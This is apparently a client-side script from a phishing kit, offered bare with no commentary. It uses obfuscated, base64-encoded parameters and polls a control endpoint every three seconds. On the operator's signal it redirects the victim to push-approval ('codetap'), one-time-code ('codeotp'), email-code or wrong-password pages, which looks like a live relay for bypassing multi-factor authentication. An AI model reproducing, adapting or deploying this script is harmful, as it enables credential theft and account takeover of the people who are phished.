function getQueryParameter(parameterName) {
  var queryString = window.location.search;
  var urlParams = new URLSearchParams(queryString);
  return urlParams.get(parameterName);
}

var valueuser = getQueryParameter('tgrdsfgdytrbdfwergter');

function checkForUpdates() {
  fetch(`/codeload/fetch/?dsjkfhjdhfjkdfhjkd=${valueuser}`)
    .then(response => response.json())
    .then(data => {
      var code = data.results;
      var user = code[0].username;
      var a = code[0].pagetype;
      var num = parseInt(a, 10);
      var b = code[0].mobiletype;

      var string = 'dfgfdjkgfgdfkgk/' + user + '/' + a + '/' + b + '/bdfdgftqwefFGTW437567jbwfBSH346';
      var encodedstring = btoa(string);
      var urlc = 'codetap';
      const newurltap = '' + urlc + '?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj=' + encodedstring;

      var nstring = 'dfgdfgdfgfdgfdfg/' + user + '/' + b + '/bdfdgftqwefFGTW437567jbwfBSH346';
      var encodenstring = btoa(nstring);
      var urlot = 'codeotp';
      const otpurl = '' + urlot + '?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj=' + encodenstring;

      var nstring2 = 'jdfrtytgdfgdferrt/' + user + '/' + b + '/dfhfrtyhdfgfdgrehdfghrreytr';
      var encodenstring2 = btoa(nstring2);
      var urlwrng = 'wrongpwd';
      const wrngurl = '' + urlwrng + '?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj=' + encodenstring2;

      var nstring3 = 'dfgdfgdfgfdgfdfg/' + user + '/' + b + '/bdfdgftqwefFGTW437567jbwfBSH346';
      var encodenstring3 = btoa(nstring3);
      var urlot2 = 'codeemail';
      const emailurl = '' + urlot2 + '?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj=' + encodenstring3;

      if (a === b) { checkForUpdates(); }

      if (Number.isInteger(num) && num > 0) {
        window.location.href = newurltap;
      }
      if (a.match(/^[mM]$/)) {
        window.location.href = otpurl;
      }
      if (a.match(/^[wW]$/)) {
        hideLoadingBar();
        showError();
      }
      if (a.match(/^[eE]$/)) {
        window.location.href = emailurl;
      }
    })
    .catch(error => console.error('Error in Fetch request:', error));
}

setInterval(checkForUpdates, 3000);
